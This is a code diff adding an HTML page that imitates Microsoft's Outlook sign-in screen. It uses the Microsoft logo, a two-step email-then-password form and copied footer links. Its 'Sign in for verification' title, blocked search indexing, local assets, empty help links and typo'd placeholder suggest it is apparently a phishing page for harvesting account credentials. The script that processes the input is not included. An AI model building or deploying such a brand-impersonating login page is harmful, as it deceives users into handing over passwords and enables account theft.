@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html dir="ltr" class="" lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Sign in for verification</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+        <meta name="robots" content="none">
+        <link rel="stylesheet" href="./style.css">
+    </head>
+    <body>
+        <style>
+            .danger{
+                color: red;
+            }
+        </style>
+        <div>
+            <div class="win-scroll">
+                <div class="sign-in-box">
+                    <div>
+                        <img class="logo" role="img" src="./MS_logo.svg" alt="Microsoft">
+                    </div>
+                    <div>
+                        <div>
+                            <form id="register" spellcheck="false" method="post" autocomplete="off">
+                                <div>
+                                    <!-- HEADING DISPLAY -->
+                                    <div class="sign-title" id="signInDisplay">
+                                        <div class="heading" aria-level="1" >Sign in</div>
+                                        <div class="subtitle">to continue to Outlook</div>
+                                    </div>
+                                    <div class="pass-title" id="userNameDisplay" style="display: none;">
+                                        <div class="sub-con" style="display: flex; align-items: center;">
+                                            <img src="./left.svg" alt="" width="20px" height="20" id="backBtn" style="cursor: pointer;">
+                                            <div id="subtitle" class="subtitle"></div>
+                                        </div>
+                                        
+                                    </div>
+                                </div>
+                                <div id="alert-con"></div>
+                                <!-- INPUT FIELD -->
+                                <div class="pagination-view  animate slide-in-next">
+                                    <div>
+                                        <!-- INPUT FIELD -->
+                                        <!-- INPUT FIELD -->
+                                        <div class="row">
+                                            <div class="form-group">
+                                                <div>
+                                                    <!-- EMAIL -->
+                                                    <input type="email" id="name" maxlength="113" class="form-control" aria-required="true" autocomplete="username" placeholder="Email, stripe, or phone">
+                                                    <!-- PASSWORD -->
+                                                    <div id="pass-con" style="display: none;">
+                                                        <label for="" style="font-weight: 500;font-size: 22px;">Enter password</label><br>
+                                                        <input type="password" id="logId" placeholder="Password" class="form-control" tabindex="-1" aria-hidden="true">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div id="accessAcc">
+                                            <div class="form-group">No account? <a href="#" id="signup" >Create one!</a></div>
+                                            <div class="form-group">
+                                                <a href="">Can’t access your account?</a>
+                                            </div>
+                                        </div>
+                                        <div id="forPass" style="display: none;">
+                                            <div class="form-group">
+                                                <a href="">Forget password?</a>
+                                            </div>
+                                        </div>
+
+                                        <!-- Button field -->
+                                        <div>
+                                            <div class=" button-container " >
+                                                <div class="inline-block">
+                                                    <input type="button" id="nextBtn" class="win-button button primary" value="Next">
+                                                </div>
+                                                <div class="inline-block">
+                                                    <input style="display: none;" type="submit" id="submitBtn" class="win-button button primary" value="Submit">
+                                                </div>
+                                                
+                                            </div>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+
+            <div id="footer" class="footer ext-footer">
+
+                <div>
+                    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+                        <a id="ftrTerms" href="#" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background">Terms of use</a>
+                        <a id="ftrPrivacy" href="#" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background">Privacy &amp; cookies</a>
+                        <a id="moreOptions" href="#" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item has-background ext-has-background">...</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+    <script src="./script.js"></script>
+</html>
